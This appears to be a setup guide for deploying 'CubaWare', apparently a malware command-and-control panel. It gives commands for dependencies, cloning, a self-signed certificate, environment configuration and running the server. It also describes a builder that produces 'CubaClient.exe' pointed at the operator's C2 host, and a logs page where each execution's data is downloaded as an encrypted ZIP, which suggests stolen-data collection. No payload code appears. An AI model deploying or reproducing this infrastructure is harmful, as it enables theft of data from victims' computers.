# Setup — VPS Deployment

---

## 1. Dependencies

**Ubuntu / Debian:**
```bash
sudo apt update && sudo apt install -y cmake ninja-build gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 openssl git curl
curl -fsSL https://bun.sh/install | bash && source ~/.bashrc
```

**Fedora / RHEL:**
```bash
sudo dnf install -y cmake ninja-build mingw64-gcc mingw64-gcc-c++ mingw64-zlib-static openssl git curl
curl -fsSL https://bun.sh/install | bash && source ~/.bashrc
```

---

## 2. Clone

```bash
git clone https://github.com/flaxyaw/CubaWare
cd CubaWare
```

---

## 3. TLS cert

Client always uploads over HTTPS. Self-signed is fine — cert validation is disabled client-side.

```bash
mkdir -p panel/server/ssl
openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
    -keyout panel/server/ssl/key.pem \
    -out    panel/server/ssl/cert.pem \
    -subj   "/CN=<your-ip-or-domain>"
```

---

## 4. Configure .env

```bash
cp panel/server/.env.example panel/server/.env
nano panel/server/.env
```

```env
PORT=443
TLS_CERT=/absolute/path/to/panel/server/ssl/cert.pem
TLS_KEY=/absolute/path/to/panel/server/ssl/key.pem
NEXT_PUBLIC_API_URL=https://<your-ip-or-domain>:443
CUBACLIENT_API_KEY=<openssl rand -hex 32>
JWT_SECRET=<openssl rand -hex 32>
DB_FILE_NAME=./src/database/cubaware.sqlite
ZIP_UPLOAD_DIR=./uploads
CORS_ORIGIN=http://localhost:3000
CLIENT_DIR=/absolute/path/to/CubaWare/client/CubaClient/CubaClient
```

Use absolute paths. `~` won't work.

---

## 5. First run

```bash
./panel.sh
```

First run installs deps, runs migrations, seeds `admin / admin`, then starts both services.

```
[server] Listening on https://0.0.0.0:443
[client] ready on http://localhost:3000
```

---

## 6. Login

Open `http://<your-server-ip>:3000` — log in with **admin / admin** and change the password.

---

## 7. Build the client

Go to `http://<your-server-ip>:3000/dashboard/builder` and fill in:

| Field | Value |
|---|---|
| C2 host | your server IP or domain |
| C2 port | `PORT` from .env |
| API key | `CUBACLIENT_API_KEY` from .env |
| ZIP password | auto-generated — **save it, it's not stored** |
| Build type | `release` |

Click **Build**. First build takes 3–8 min (fetches minizip-ng). Subsequent builds are faster.

Download `CubaClient.exe` when done.

---

## 8. Retrieve logs

`http://<your-server-ip>:3000/dashboard/logs` — each row is one execution. Download the ZIP and open with your ZIP password.

---

## Running in background

```bash
# nohup
nohup ./panel.sh > panel.log 2>&1 &
echo $! > panel.pid
kill $(cat panel.pid)  # to stop

# or screen
screen -S cuba
./panel.sh
# Ctrl+A, D to detach — screen -r cuba to reattach
```

---

## Port notes

`PORT=443` needs root or `CAP_NET_BIND_SERVICE`. Use `8443` or `3001` if you don't want to run as root.

Frontend (3000) can stay localhost-only if you SSH tunnel:
```bash
ssh -L 3000:localhost:3000 user@yourserver
```
